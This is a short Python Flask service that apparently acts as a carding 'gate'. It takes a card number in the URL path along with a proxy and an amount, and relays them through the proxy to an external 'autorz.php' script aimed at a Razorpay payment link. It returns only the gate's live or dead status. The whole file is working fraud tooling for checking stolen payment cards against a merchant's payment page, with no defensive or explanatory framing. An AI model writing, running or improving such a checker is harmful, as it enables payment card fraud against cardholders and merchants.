from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TARGET = "https://mydom.arpitchk.shop/autorz.php/"

@app.route('/gate=rz/cc=<card>', methods=['GET'])
def gate(card):
    proxy = request.args.get('proxy')
    amount = request.args.get('amount', '100')

    if not proxy:
        return jsonify({"status": "error", "message": "proxy parameter missing"}), 400

    url = f"{TARGET}?cc={card}&url=https://razorpay.me/@ukinternational&proxy={proxy}&amount={amount}"

    try:
        proxies = {
            "http":  f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        r = requests.get(url, proxies=proxies, timeout=30)

        # Let it crash if not JSON → we catch below
        data = r.json()

        # Return ONLY status and message
        return jsonify({
            "status": data.get("status", "unknown"),
            "message": data.get("message", "No message from gate")
        })

    except Exception as e:
        return jsonify({
            "status": "gateway_error",
            "message": "Dead proxy / gate down / invalid response"
        }), 502


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
